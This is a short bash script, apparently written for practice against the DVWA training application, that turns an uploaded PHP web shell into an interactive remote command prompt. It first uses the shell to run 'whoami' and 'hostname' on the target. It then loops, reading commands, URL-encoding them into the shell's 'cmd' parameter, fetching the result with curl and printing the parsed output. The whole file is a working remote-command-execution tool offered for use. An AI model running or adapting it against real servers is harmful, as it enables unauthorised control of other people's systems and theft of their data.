#!/bin/bash

# Author: Joaquin Pochat

#Colours
declare -r greenColour="\e[0;32m\033[1m"
declare -r endColour="\033[0m\e[0m"
declare -r redColour="\e[0;31m\033[1m"
declare -r blueColour="\e[0;34m\033[1m"
declare -r yellowColour="\e[0;33m\033[1m"
declare -r purpleColour="\e[0;35m\033[1m"
declare -r turquoiseColour="\e[0;36m\033[1m"
declare -r grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
    tput cnorm
    echo -e "\n\n${turquoiseColour}Gracias por usar nuestra shell! ${endColour}"
    exit 1
}

echo -e 'Introduzca su url (sin el comando)'
echo -e 'Ejemplo: '${yellowColour}'"192.168.0.9/dvwa/hackable/uploads/image.php.jpg?cmd="'${endColour}
read -p 'URL: ' url

curl -s $url'whoami' > pagina.txt
whoami=$(strings pagina.txt | grep "*<pre>" | sed 's/*<pre>//')

curl -s $url'hostname' > pagina.txt
hostname=$(strings pagina.txt | grep "*<pre>" | sed 's/*<pre>//')
rm pagina.txt

while true
do
	
	if [ $comando = 'exit' ]; then
	    echo -e "${turquoiseColour}Gracias por usar nuestra shell! ${endColour}"
	    echo ""
	    break
	fi 2>/dev/null
	
	if [ $comando = 'clear' ]; then
	    echo -e "${turquoiseColour}No se puede hacer en esta shell :( ${endColour}"
	    echo ""
	fi 2>/dev/null	
	
	if [ $comando = 'cd' ]; then
	    echo -e "${turquoiseColour}No se puede hacer en esta shell :( ${endColour}"
	    echo ""
	fi 2>/dev/null
	
	read -p $whoami@$hostname'$: ' comando
	final=$(echo $url$comando | sed 's/ /%20/g')
	curl -s $final > salida.txt
	awk -v nr="$(wc -l < salida.txt)" 'NR>0 && NR<(nr-210)' salida.txt | cut -d '>' -f2
	rm salida.txt
	
done


